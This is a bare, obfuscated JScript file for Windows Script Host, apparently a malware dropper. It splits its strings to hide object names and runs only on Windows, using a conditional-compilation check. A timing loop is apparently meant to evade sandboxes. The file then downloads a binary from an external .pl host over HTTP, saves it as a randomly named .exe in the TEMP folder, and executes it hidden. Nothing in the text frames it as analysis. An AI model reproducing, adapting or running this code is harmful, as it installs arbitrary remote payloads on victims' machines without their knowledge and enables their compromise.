var V = false;
var N0 = "Create"+"Object";
var GY = function RU() {return WScript[N0]("WScript"+".Shell");}(), NV = 11;
var P = "MSXML2"+".XMLHTTP";
var U = 2;
var XQ = U - 2;
function N(P0){GY["Run"](P0, XQ, XQ);};
function D(){return P + "";};
function Z(S, R0){XQ = XQ * 1; return S - R0;};
function LY(){return N0;};
/*@cc_on
  @if (@_win32 || @_win64)
    V = true;
  @end
@*/
if (V)
{
var O0 = "";
function OH(){return 22;};
var WR = 0; var IW = 0;
function O()
{
var PO = new this["Date"]();
var E = PO["getUTCMilliseconds"]();
WScript["Sleep"](OH());
var PO = new this["Date"]();
var C = PO["getUTCMilliseconds"]();
WScript["Sleep"](OH());
var PO = new this["Date"]();
var G0 = PO["getUTCMilliseconds"]();
var WR = "R";
WR = Z(C, E);
var IW = "G";
IW = Z(G0, C);
O0 = "open";
return Z(WR, IW);
}
var FV = false;
var JR = false;
for (var DC = XQ; DC < OH() * 1; DC++){if (O() != XQ){
FV = true; 
IW = "31" + 11 * WR + IW; 
JR = true; 
break;
}}
function HW() {return ((FV == true) && (FV == JR)) ? 1 : XQ;};
if (FV && HW() && JR){
function GH() {return GY["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "cOObgSR5e.ex" + "e";};
 J = D();
 X = WScript[N0](J);
 var VA = 1;
do { 
	for (;VA;){
	try {
		if (VA == 1)
		{
			X[O0]("GET", "http://xn--po-wqa.pl/a8zkde", false);
			X["send"]();
			VR = "Sleep";
			VA = 2;
		}
		WScript[VR](OH() + 120); 
		if (X["readystate"] < 2 * 2) continue;
		VA = XQ;
		function RF(M) {var XU = (1, 2, 3, 4, 5, M); return XU;};
		SS = WScript[LY()]("ADODB.Stream");
		J = SS;
		J[O0]();
		J["type"] = RF(1);
		J["write"](X["ResponseBody"]);
		SS["position"] = RF(XQ);
		J["Save" + "ToFile"](GH(), 2);
		SS["cl"+"ose"]();
		CW = GH();
		N(CW);
	} catch(E0){};};
}while (VA);
}
}

